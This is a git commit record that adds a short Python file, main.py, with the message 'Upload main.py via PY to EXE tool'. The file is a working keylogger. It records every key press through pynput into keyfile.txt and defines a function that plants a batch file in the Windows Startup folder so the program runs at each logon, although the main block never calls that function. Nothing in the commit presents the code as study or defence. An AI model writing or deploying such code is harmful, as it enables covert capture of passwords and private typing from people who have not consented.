5e98b88c421d3f6fd8095e00a2349547766d830a
unamed666 <52182376+eroge69@users.noreply.github.com>
2025-05-27 01:36:47 +0700

    Upload main.py via PY to EXE tool

---
+++ python-files/main.py
@@ -0,0 +1,27 @@
+import getpass
+import os
+USER_NAME = getpass.getuser()
+
+
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" "%s"' % file_path)
+        
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
